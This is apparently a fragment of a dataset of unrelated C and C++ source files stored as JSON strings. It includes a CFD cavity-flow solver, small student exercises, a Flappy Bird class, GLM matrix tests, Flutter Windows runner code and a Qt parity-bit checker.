u[i][j]=(0.5/dely)*(psi[i][j+1]-psi[i][j-1]);\r\n\t              v[i][j]=-(0.5/delx)*(psi[i+1][j]-psi[i-1][j]);\r\n\t            }\r\n\t        }\r\n\t   for(j=1;j<(n-1);j++)\r\n    \t{\r\n\t    \tfor(i=1;i<(m-1);i++)\r\n\t\t\t{\r\n\t\t\t\tomega[i][j]=(0.5/(1.0+pow(beta,2)))*((1.0-((psi[i][j+1]-psi[i][j-1])*((beta*Re)/4.0)))*omega[i+1][j]\r\n\t\t\t\t+(1.0+((psi[i][j+1]-psi[i][j-1])*((beta*Re)/4.0)))*omega[i-1][j]\r\n\t\t\t\t+((1.0+((psi[i+1][j]-psi[i-1][j])*(Re/(4.0*beta))))*(pow(beta,2)*omega[i][j+1]))\r\n\t\t\t\t+((1.0-((psi[i+1][j]-psi[i-1][j])*(Re/(4.0*beta))))*(pow(beta,2)*omega[i][j-1]))); \r\n     \t    } \r\n\t    }\r\n\t    \tfor(j=0;j<n;j++)\r\n        \t{\r\n\t\t        for(i=0;i<m;i++)\r\n\t        \t{\r\n\t\t    \t  if(j==(n-1))\r\n\t\t       \t{\r\n\t\t\t    \tomega[i][j]=((2.0/pow(dely,2))*(psi[i][j]-psi[i][j-1]))-(2.0/dely);\r\n\t\t    \t}\r\n\t\t    \telse if(j==0)\r\n\t\t    \t{\r\n\t\t\t    \tomega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i][j+1]);\r\n\t\t    \t}\r\n\t\t    \telse if(i==0)\r\n\t\t    \t{\r\n\t\t\t        omega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i+1][j]);\t\r\n\t\t    \t}\r\n\t\t    \telse if(i==(m-1))\r\n\t\t    \t{\r\n\t\t\t        omega[i][j]=(2.0/pow(dely,2))*(psi[i][j]-psi[i-1][j]);\t\r\n\t\t    \t}\r\n\t        \t}\r\n        \t}\r\n      error_psi=0.0;\r\n\t  error_omega=0.0;\r\n\t  \r\n\t  \tfor(j=1;j<(n-1);j++)\r\n        \t{\r\n\t\t        for(i=1;i<(m-1);i++)\r\n\t        \t{\r\n\t        \t\terror_psi=error_psi+pow((psi[i][j]-psi_prev[i][j]),2.0);\r\n\t        \t\terror_omega=error_omega+pow((omega[i][j]-omega_prev[i][j]),2.0);\r\n\t        \t}\r\n\t        }\r\n\t    \terror_psi=sqrt(error_psi/midpts);\r\n\t    \terror_omega=sqrt(error_omega/midpts);\r\n\t    \tprintf(\"iteration=%d\\t\",iteration);\r\n\t    \tprintf(\"error_psi=%.10lf\\terror_omega=%.10lf\\n\",error_psi,error_omega);\r\n\t    \titeration++;\r\n\t    \r\n\t    }\r\n\t    while(error_psi>1.0e-6||error_omega>1.0e-6);\r\n\t    \r\n\t\t\t\r\n\t        \tFILE*file;\r\n\t        \t\r\n          \tfile=fopen(\"outputlid_Re_100.dat\",\"w\");\r\n          \t\r\n\t        fprintf(file,\"Zone I=%d, J=%d\\n\",m,n);\r\n\t        \r\n\t         for(j=0;j<n;j++)\r\n           \t   {\r\n           \t   \ty=j*dely;\r\n\t    \t      for(i=0;i<m;i++)\r\n\t    \t      {\r\n\t    \t      \tx=i*delx;\r\n\t    \t      \r\n\t    \t      \tfprintf(file,\"%lf\\t%lf\\t%lf\\t%lf\\t%lf\\t%lf\\n\",x,y,u[i][j],v[i][j],psi[i][j],omega[i][j]);\r\n\t\t          }\r\n                }\r\n                \r\n        fclose(file);\r\n        FILE *f1;\r\n f1=fopen(\"v_mid.dat\",\"w\");\r\nfor(i=0; i<m; i++)\r\n{\r\n\tx=delx*i;\r\n\t\r\n\tfprintf(f1,\"%lf\\t%lf\\n\",x,v[50][i]);\r\n\t\r\n}\r\nfclose(f1);\r\nFILE*f2;\r\nf2=fopen(\"u_mid.dat\",\"w\");\r\nfor(i=0; i<m; i++)\r\n{\r\n\tx=delx*i;\r\n\t\r\n\tfprintf(f2,\"%lf\\t%lf\\n\",u[i][50],x);\r\n\t\r\n}\r\nfclose(f2);\r\n}\r\n\r\n",
    "#include <bits/stdc++.h>\n#define fi first\n#define se second\n#define ms(a, n) memset(a, n, sizeof(a))\n#define endl \"\\n\"\nusing namespace std;\n\nusing ll = long long;\n\ntypedef pair<ll, ll> pl;\ntypedef vector<pl> vll;\ntypedef pair<int, int> pi;\ntypedef vector<pi> vii;\n\nconst int modi = 1000000007;\nconst ll modl = 1e18 + 7;\n\nint check(int n)\n{\n    int cnt = 0;\n    for (int i = 2; i <= sqrt(n); ++i)\n    {\n        if (n % i == 0)\n        {\n            ++cnt;\n            int dem = 0;\n            while (n % i == 0)\n            {\n                ++dem;\n                n /= i;\n                if (dem == 2)\n                    return 0;\n            }\n        }\n    }\n    if (n != 1)\n    {\n        ++cnt;\n        if (cnt != 3)\n            return 0;\n    }\n    return 1;\n}\nint main()\n{\n    ios_base::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        int n;\n        cin >> n;\n        if (check(n))\n            cout << 1 << endl;\n        else\n            cout << 0 << endl;\n    }\n    return 0;\n}",
    "#include \"simulation.h\"\n\n// Constructor for Simulation\nSimulation::Simulation(Life** life, int numLife) {\n    watchme = 1;\n    steps = 0;\n    automate = false;\n    matrix = new Matrix();\n\n    if (life != nullptr) {\n        for (int i = 0; i < numLife; i++) {\n            if (life[i] != nullptr) {\n                bool success = matrix->initState(life[i]);\n                if (!success) {\n                    std::cout << \"Failed to add life to the matrix\" << std::endl;\n                }\n            }\n        }\n    }\n}\n\n// Destructor for Simulation\nSimulation::~Simulation() {\n    delete matrix;\n}\n\n// Method to run the simulation\nvoid Simulation::simulate() {\n    while (true) {\n        matrix->render();\n\n        if (!automate) {\n            std::cout << \"command (<space> to step, <a> to automate, <q> to quit): \";\n\n            std::string action;\n            std::getline(std::cin, action);\n\n            switch (action[0]) {\n            default:\n                std::cout << '\\a' << std::endl;  // beep\n                continue;\n            case 'q':\n                std::cout << \"Quitting Game.\" << std::endl;\n                return;\n            case ' ':\n                break;\n            case 'a':\n                automate = true;\n                break;\n            }\n        }\n        else {\n            if (steps >= MAX_STEPS) {\n                std::cout << \"Reached max steps, quitting.\" << std::endl;\n                return;\n            }\n            delay(300);\n        }\n        steps++;\n        matrix->computeNextState();\n    }\n}\n\n// Method to report status\nvoid Simulation::report() {\n    std::string msg = \"Hello World!\"; // Replace Hello World with your answer.\n    std::cout << msg << std::endl;\n}\n\n// Method for 'two' operation\nint Simulation::two(int u) {\n    return (u << 2) % 10;\n}\n\n// Method for 'three' operation\nint Simulation::three(int x) {\n    if (x % 2 == 0)\n        return 5;\n    else\n        return 3;\n}\n\n// Method for 'one' operation\nvoid Simulation::one(int t) {\n    int i = 0;\n    int k = watchme;\n    while (++i < t) {\n        if (i == 0)\n            k = 2;\n        else if (i == 1)\n            k = 7;\n        else if (i == 4)\n            k = 8;\n        else if (i == 5)\n            k = 5;\n        else\n            k = two(watchme);\n        watchme = k;\n    }\n    k = three(watchme);\n    watchme = k;\n}\n\n// Private method for delay\nvoid Simulation::delay(int ms) const {\n    std::this_thread::sleep_for(std::chrono::milliseconds(ms));\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\nclass Bank\r\n{\r\n    int principal;\r\n    int year;\r\n    float rate;\r\n\r\npublic:\r\n    Bank() {}\r\n    Bank(int p, int y, float r)\r\n    {\r\n        principal = p;\r\n        year = y;\r\n        rate = r;\r\n    }\r\n    Bank(int p, int y, int r)\r\n    {\r\n        principal = p;\r\n        year = y;\r\n        rate = float(r) / 100;\r\n    }\r\n    void Display()\r\n    {\r\n        float returnvalue = principal;\r\n        for (int i = 0; i < year; i++)\r\n        {\r\n            returnvalue = returnvalue * (1 + rate);\r\n        }\r\n        cout << \"The return value after \"\r\n             << year << \" year for principal amount \" << principal\r\n             << \" is \" << returnvalue << \".\" << endl;\r\n    }\r\n    ~Bank()\r\n    {\r\n        cout << \"Destructor is called for principal, year and rate \" << principal\r\n             << \" , \" << year << \" and \" << rate << \" respectively.\" << endl;\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    int x, y;\r\n    float z;\r\n    cout << \"Enter the valu of Principal , Year and Rate respectively.\" << endl;\r\n    cin >> x >> y >> z;\r\n    Bank b2, b3;\r\n    b2 = Bank(x, y, z);\r\n    b2.Display();\r\n    int Z;\r\n    cout << \"Enter the valu of Principal , Year and Rate respectively.\" << endl;\r\n    cin >> x >> y >> Z;\r\n    b3 = Bank(x, y, Z);\r\n    b3.Display();\r\n\r\n    return 0;\r\n}",
    "#include \"Bird.h\"\r\nBird::Bird(int x ,int y , sf::Texture texture) {\r\n\tthis->birdTexture = texture;\r\n\tload(x, y, birdTexture);\r\n}\r\nBird::Bird(int x, int y) {\r\n\tbirdTexture.loadFromFile(\"flappy.png\");\r\n\tload(x, y, birdTexture);\r\n\r\n}\r\nvoid Bird::load(int x, int y,sf::Texture& texture) {\r\n\tthis->jump_hight = 0.4f;\r\n\tthis->gravity_r = 0.5f;\r\n\tthis->cur_gravity_r = gravity_r;\r\n\r\n\tthis->setTexture(texture);\r\n\tthis->setPosition(x, y);\r\n\tthis->setScale(0.1f, 0.1f);\r\n}\r\nvoid Bird::jump(sf::Time deltatime) {\r\n\tthis->cur_gravity_r = -1.0f;\r\n\tsf::Vector2 cur_pos = this->getPosition();\r\n\tthis->setPosition(cur_pos.x, cur_pos.y - jump_hight * deltatime.asMilliseconds());\r\n}\r\nvoid Bird::gravity(sf::Time deltatime) {\r\n\tif (cur_gravity_r < gravity_r) {\r\n\t\tcur_gravity_r += 0.1f;\r\n\t}\r\n\tsf::Vector2 cur_pos = this->getPosition();\r\n\tthis->setPosition(cur_pos.x, cur_pos.y + cur_gravity_r * deltatime.asMilliseconds());\r\n}\r\nbool Bird::checkCollision(Pipe pipe) {\r\n\tif (this->getGlobalBounds().intersects(pipe.up.getGlobalBounds())) {\r\n\t\treturn true;\r\n\t}\r\n\tif (this->getGlobalBounds().intersects(pipe.down.getGlobalBounds())) {\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}",
    "#include <glm/ext/matrix_relational.hpp>\n#include <glm/ext/matrix_double2x2.hpp>\n#include <glm/ext/matrix_double2x3.hpp>\n#include <glm/ext/matrix_double2x4.hpp>\n#include <glm/ext/matrix_double3x2.hpp>\n#include <glm/ext/matrix_double3x3.hpp>\n#include <glm/ext/matrix_double3x4.hpp>\n#include <glm/ext/matrix_double4x2.hpp>\n#include <glm/ext/matrix_double4x3.hpp>\n#include <glm/ext/matrix_double4x4.hpp>\n#include <glm/ext/vector_double2.hpp>\n#include <glm/ext/vector_double3.hpp>\n#include <glm/ext/vector_double4.hpp>\n#include <glm/ext/matrix_float2x2.hpp>\n#include <glm/ext/matrix_float2x3.hpp>\n#include <glm/ext/matrix_float2x4.hpp>\n#include <glm/ext/matrix_float3x2.hpp>\n#include <glm/ext/matrix_float3x3.hpp>\n#include <glm/ext/matrix_float3x4.hpp>\n#include <glm/ext/matrix_float4x2.hpp>\n#include <glm/ext/matrix_float4x3.hpp>\n#include <glm/ext/matrix_float4x4.hpp>\n#include <glm/ext/vector_float2.hpp>\n#include <glm/ext/vector_float3.hpp>\n#include <glm/ext/vector_float4.hpp>\n#include <glm/ext/scalar_ulp.hpp>\n\ntemplate <typename matType, typename vecType>\nstatic int test_equal()\n{\n\ttypedef typename matType::value_type valType;\n\n\tvalType const Epsilon = static_cast<valType>(0.001f);\n\tvalType const One = static_cast<valType>(1);\n\tvalType const Two = static_cast<valType>(2);\n\n\tint Error = 0;\n\n\tError += glm::all(glm::equal(matType(One), matType(One), Epsilon)) ? 0 : 1;\n\tError += glm::all(glm::equal(matType(One), matType(Two), vecType(Epsilon))) ? 1 : 0;\n\n\treturn Error;\n}\n\ntemplate <typename matType, typename vecType>\nstatic int test_notEqual()\n{\n\ttypedef typename matType::value_type valType;\n\n\tvalType const Epsilon = static_cast<valType>(0.001f);\n\tvalType const One = static_cast<valType>(1);\n\tvalType const Two = static_cast<valType>(2);\n\n\tint Error = 0;\n\n\tError += !glm::any(glm::notEqual(matType(One), matType(One), Epsilon)) ? 0 : 1;\n\tError += !glm::any(glm::notEqual(matType(One), matType(Two), vecType(Epsilon))) ? 1 : 0;\n\n\treturn Error;\n}\n\n\ntemplate <typename T>\nstatic int test_equal_ulps()\n{\n\ttypedef glm::mat<4, 4, T, glm::defaultp> mat4;\n\n\tT const One(1);\n\tmat4 const Ones(1);\n\n\tint Error = 0;\n\n\tT const ULP1Plus = glm::nextFloat(One);\n\tError += glm::all(glm::equal(Ones, mat4(ULP1Plus), 1)) ? 0 : 1;\n\n\tT const ULP2Plus = glm::nextFloat(ULP1Plus);\n\tError += !glm::all(glm::equal(Ones, mat4(ULP2Plus), 1)) ? 0 : 1;\n\n\tT const ULP1Minus = glm::prevFloat(One);\n\tError += glm::all(glm::equal(Ones, mat4(ULP1Minus), 1)) ? 0 : 1;\n\n\tT const ULP2Minus = glm::prevFloat(ULP1Minus);\n\tError += !glm::all(glm::equal(Ones, mat4(ULP2Minus), 1)) ? 0 : 1;\n\n\treturn Error;\n}\n\ntemplate <typename T>\nstatic int test_notEqual_ulps()\n{\n\ttypedef glm::mat<4, 4, T, glm::defaultp> mat4;\n\n\tT const One(1);\n\tmat4 const Ones(1);\n\n\tint Error = 0;\n\n\tT const ULP1Plus = glm::nextFloat(One);\n\tError += !glm::all(glm::notEqual(Ones, mat4(ULP1Plus), 1)) ? 0 : 1;\n\n\tT const ULP2Plus = glm::nextFloat(ULP1Plus);\n\tError += glm::all(glm::notEqual(Ones, mat4(ULP2Plus), 1)) ? 0 : 1;\n\n\tT const ULP1Minus = glm::prevFloat(One);\n\tError += !glm::all(glm::notEqual(Ones, mat4(ULP1Minus), 1)) ? 0 : 1;\n\n\tT const ULP2Minus = glm::prevFloat(ULP1Minus);\n\tError += glm::all(glm::notEqual(Ones, mat4(ULP2Minus), 1)) ? 0 : 1;\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_equal_ulps<float>();\n\tError += test_equal_ulps<double>();\n\tError += test_notEqual_ulps<float>();\n\tError += test_notEqual_ulps<double>();\n\n\tError += test_equal<glm::mat2x2, glm::vec2>();\n\tError += test_equal<glm::mat2x3, glm::vec2>();\n\tError += test_equal<glm::mat2x4, glm::vec2>();\n\tError += test_equal<glm::mat3x2, glm::vec3>();\n\tError += test_equal<glm::mat3x3, glm::vec3>();\n\tError += test_equal<glm::mat3x4, glm::vec3>();\n\tError += test_equal<glm::mat4x2, glm::vec4>();\n\tError += test_equal<glm::mat4x3, glm::vec4>();\n\tError += test_equal<glm::mat4x4, glm::vec4>();\n\n\tError += test_equal<glm::dmat2x2, glm::dvec2>();\n\tError += test_equal<glm::dmat2x3, glm::dvec2>();\n\tError += test_equal<glm::dmat2x4, glm::dvec2>();\n\tError += test_equal<glm::dmat3x2, glm::dvec3>();\n\tError += test_equal<glm::dmat3x3, glm::dvec3>();\n\tError += test_equal<glm::dmat3x4, glm::dvec3>();\n\tError += test_equal<glm::dmat4x2, glm::dvec4>();\n\tError += test_equal<glm::dmat4x3, glm::dvec4>();\n\tError += test_equal<glm::dmat4x4, glm::dvec4>();\n\n\tError += test_notEqual<glm::mat2x2, glm::vec2>();\n\tError += test_notEqual<glm::mat2x3, glm::vec2>();\n\tError += test_notEqual<glm::mat2x4, glm::vec2>();\n\tError += test_notEqual<glm::mat3x2, glm::vec3>();\n\tError += test_notEqual<glm::mat3x3, glm::vec3>();\n\tError += test_notEqual<glm::mat3x4, glm::vec3>();\n\tError += test_notEqual<glm::mat4x2, glm::vec4>();\n\tError += test_notEqual<glm::mat4x3, glm::vec4>();\n\tError += test_notEqual<glm::mat4x4, glm::vec4>();\n\n\tError += test_notEqual<glm::dmat2x2, glm::dvec2>();\n\tError += test_notEqual<glm::dmat2x3, glm::dvec2>();\n\tError += test_notEqual<glm::dmat2x4, glm::dvec2>();\n\tError += test_notEqual<glm::dmat3x2, glm::dvec3>();\n\tError += test_notEqual<glm::dmat3x3, glm::dve",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"paritybits.h\"\n#include \"ui_paritybits.h\"\n\n#include <QMessageBox>\n#include <QRegularExpression>\n\nParityBits::ParityBits(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::parityBits)\n{\n    ui->setupUi(this);\n    this->setWindowTitle(\"\u041c\u0435\u0442\u043e\u0434\u044b \u043e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d\u0438\u044f \u043e\u0448\u0438\u0431\u043e\u043a\");\n}\n\nParityBits::~ParityBits()\n{\n    delete ui;\n}\n\nvoid ParityBits::on_checkButton_clicked()\n{\n    QString str = ui->lineEditBinary->text();\n    QMessageBox msgBox;\n    msgBox.setWindowTitle(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f\");\n\n    if (str.isEmpty()) {\n        msgBox.setText(\"\u0412\u044b \u043d\u0435 \u0432\u0432\u0435\u043b\u0438 \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435!\");\n        msgBox.exec();\n        return;\n    }\n\n    if (ui->parityRadBtn->isChecked()) {\n        ui->resOfCalcParityLabel->setText(calculateParityBits(str));\n\n        if (ui->imitateErrorsCheckBox->isChecked())\n            imitateErrors(str);\n\n        if (checkDataParity(str, ui->resOfCalcParityLabel->text()))\n            msgBox.setText(\"\u041e\u0448\u0438\u0431\u043e\u043a \u043d\u0435\u0442\");\n        else\n            msgBox.setText(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d\u0430!\");\n\n         msgBox.exec();\n    }\n\n    if (ui->VerHorParityRadBtn->isChecked()) {\n        if (str.length() % 64 != 0) {\n            msgBox.setText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0434\u043b\u0438\u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u043a\u0440\u0430\u0442\u043d\u0430 64!\");\n            msgBox.exec();\n            return;\n        }\n\n        QVector<QString> msg = splitBinaryString(str);\n        ui->resOfCalcParityLabel->setText(verHorCalculateParity(msg));\n\n        QString horParity = calculateHorizontalParity(msg);\n        QString verParity = calculateVerticalParity(msg);\n\n        if (ui->imitateErrorsCheckBox->isChecked())\n            imitateErrors(msg);\n\n        if (checkDataVerHorParity(msg, horParity, verParity))\n            msgBox.setText(\"\u041e\u0448\u0438\u0431\u043e\u043a \u043d\u0435\u0442\");\n        else\n            msgBox.setText(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d\u0430!\");\n\n        msgBox.exec();\n    }\n\n    if (!ui->parityRadBtn->isChecked() && !ui->VerHorParityRadBtn->isChecked()) {\n        msgBox.setText(\"\u0412\u044b\u0431\u0435\u0440\u0435\u0442\u0435 \u043c\u0435\u0442\u043e\u0434!\");\n        msgBox.exec();\n    }\n}\n\nQString ParityBits::calculateParityBits(const QString &message)\n{\n    QString parityBits;\n\n    for (unsigned int i = 0; i < message.length(); i += 8) {\n        int count = 0;\n        // \u041e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0431\u043b\u043e\u043a \u0434\u043b\u0438\u043d\u043e\u0439 8 \u0431\u0438\u0442\n        for (unsigned int j = i; j < i + 8 && j < message.length(); ++j) {\n            if (message[j] == '1') {\n                count++;\n            }\n        }\n        // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0431\u0438\u0442 \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044f\n        parityBits += (count % 2 == 0) ? '0' : '1';\n    }\n    return parityBits;\n}\n\nQString ParityBits::verHorCalculateParity(const QVector<QString> &message)\n{\n    QString horizontalParity = calculateHorizontalParity(message);\n\n    // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0439 \u043f\u0430\u0440\u0438\u0442\u0435\u0442\n    QString verticalParity = calculateVerticalParity(message);\n\n    return verticalParity;\n}\n\nQString ParityBits::calculateHorizontalParity(const QVector<QString> &data)\n{\n    QString parityBits;\n    for (const auto& row : data) {\n        int count = 0;\n        for (QChar bit : row) {\n            if (bit == '1') count++;\n        }\n        parityBits += (count % 2 == 0) ? '0' : '1'; // \u0427\u0435\u0442\u043d\u044b\u0439 \u043f\u0430\u0440\u0438\u0442\u0435\u0442\n    }\n    return parityBits;\n}\n\nQString ParityBits::calculateVerticalParity(const QVector<QString> &data)\n{\n    QString verticalParity;\n    int cols = data[0].size();\n\n    for (int j = 0; j < cols; ++j) {\n        int count = 0;\n        for (int i = 0; i < data.size(); ++i) {\n            if (data[i][j] == '1') count++;\n        }\n\n        verticalParity += (count % 2 == 0) ? '0' : '1'; // \u0427\u0435\u0442\u043d\u044b\u0439 \u043f\u0430\u0440\u0438\u0442\u0435\u0442\n    }\n    return verticalParity;\n}\n\nQVector<QString> ParityBits::splitBinaryString(const QString &binaryString)\n{\n    QVector<QString> result;\n\n    // \u0423\u0431\u0435\u0434\u0438\u043c\u0441\u044f, \u0447\u0442\u043e \u0441\u0442\u0440\u043e\u043a\u0430 \u0441\u043e\u0441\u0442\u043e\u0438\u0442 \u0442\u043e\u043b\u044c\u043a\u043e \u0438\u0437 '0' \u0438 '1'\n    if (!binaryString.contains(QRegularExpression(\"[^01]\"))) {\n        int length = binaryString.length();\n\n        // \u0420\u0430\u0437\u0434\u0435\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u043d\u0430 \u0431\u043b\u043e\u043a\u0438 \u043f\u043e 16 \u0431\u0438\u0442\n        for (int i = 0; i < length; i += 16) {\n            QString byte = binaryString.mid(i, 16);\n            result.append(byte);\n        }\n    } else {\n        qDebug() << \"\u041e\u0448\u0438\u0431\u043a\u0430: \u0441\u0442\u0440\u043e\u043a\u0430 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b.\";\n    }\n\n    return result;\n}\n\nbool ParityBits::checkDataVerHorParity(const QVector<QString> &data, const QString &horizontalParity, const QString &verticalParity)\n{\n    for (unsigned int i = 0; i < data.size(); ++i) {\n        int count = 0;\n        for (auto bit : data[i]) {\n            if (bit == '1') count++;\n        }\n        if ((count % 2) != (horizontalParity[i].digitValue() - 0)) {\n            return false; // \u041e\u0448\u0438\u0431\u043a\u0430 \u0432 \u0441\u0442\u0440\u043e\u043a\u0435\n        }\n    }\n\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0430\u0440\u0438\u0442\u0435\u0442\u0430\n    int cols = data[0].size();\n    for (int j = 0; j < cols; ++j) {\n        int count = 0;\n        for (unsigned int i = 0; i < data.size(); ++i) {\n            if (data[i][j] == '1') count++;\n        }\n        if ((count % 2) != (verticalParity[j].digitValue() - 0)) {\n            return false; // \u041e\u0448\u0438\u0431\u043a\u0430 \u0432 \u0441\u0442\u043e\u043b\u0431\u0446\u0435\n        }\n    }\n\n    return true; // \u041e\u0448\u0438\u0431\u043e\u043a \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e\n}\n\nbool ParityBits::checkDataParity(const QString &receivedMessage, const QString &receivedParity)\n{\n    QString calculatedParity = calculateParityBits(rec",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"invoicesapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int i1, j1, n, c, r, i, j, mar[10][10], sol[0][0], marsul = 0;\r\n    cout << \"enter row\" << endl;\r\n    cin >> r;\r\n    cout << \"enter colam\" << endl;\r\n    cin >> c;\r\n    for (i = 0; i < r; i++)\r\n    {\r\n        for (j = 0; j < c; j++)\r\n        {\r\n            cout << \"enter no\" << endl;\r\n            cin >> mar[i][j];\r\n        }\r\n    }\r\n    for (i = 0; i < r; i++)\r\n    {\r\n        for (j = 0; j < c; j++)\r\n        {\r\n            cout << \"  \" << mar[i][j];\r\n        }\r\n        cout << \"\\n\";\r\n    }\r\n    /*  cout<<\"reverse matrix\"<<endl;\r\n\r\n      for(i=0; i<r; i++){\r\n      for(j=0; j<c; j++){\r\n        cout<<\"  \"<<mar[j][i];\r\n      }\r\n       cout<<\"\\n\";\r\n  }*/\r\n    cout << \"matrix  solve\";\r\n    int s1 = 0, s2 = 0, s3 = 0, sum = 0;\r\n\r\n    for (i = 0; i < r; i++)\r\n    {\r\n        for (j = 0; j < c; j++)\r\n        {\r\n\r\n            s1 = mar[0][0] * ((mar[1][2] * mar[2][1]) - (mar[1][1] * mar[2][2]));\r\n\r\n            s2 = mar[0][1] * ((mar[1][2] * mar[2][0]) - (mar[1][0] * mar[2][2]));\r\n\r\n            s3 = mar[0][2] * ((mar[1][1] * mar[2][0]) - (mar[1][0] * mar[2][1]));\r\n        }\r\n    }\r\n    sum = s1 + s2 + s3;\r\n    cout << sum << endl;\r\n    int sp = 0;\r\n    cout << \"why to solve any one matrix to enter 1, another exit to enter any no :-\\n\";\r\n    cin >> sp;\r\n    if (sp == 1)\r\n    {\r\n        cout << \"plese enter the soulve with row  \";\r\n        cin >> i1;\r\n        cout << \"plese enter the soulve with row in coulm  \";\r\n        cin >> j1;\r\n\r\n        if (mar[0][0] == sol[i1][j1])\r\n        {\r\n            for (i = 0; i < r; i++)\r\n            {\r\n                for (j = 0; j < c; j++)\r\n                {\r\n\r\n                    marsul = mar[0][0] * ((mar[1][2] * mar[2][1]) - (mar[1][1] * mar[2][2]));\r\n                }\r\n            }\r\n        }\r\n        if (mar[0][1] == sol[i1][j1])\r\n        {\r\n            for (i = 0; i < r; i++)\r\n            {\r\n                for (j = 0; j < c; j++)\r\n                {\r\n\r\n                    marsul = mar[0][1] * ((mar[1][2] * mar[2][0]) - (mar[1][0] * mar[2][2]));\r\n                }\r\n            }\r\n        }\r\n        if (mar[0][2] == sol[i1][j1])\r\n        {\r\n            for (i = 0; i < r; i++)\r\n            {\r\n                for (j = 0; j < c; j++)\r\n                {\r\n\r\n                    marsul = mar[0][2] * ((mar[1][1] * mar[2][0]) - (mar[1][0] * mar[2][1]));\r\n                }\r\n            }\r\n        }\r\n        cout << marsul << endl;\r\n    }\r\n    else\r\n    {\r\n        exit(0);\r\n    }\r\n}",
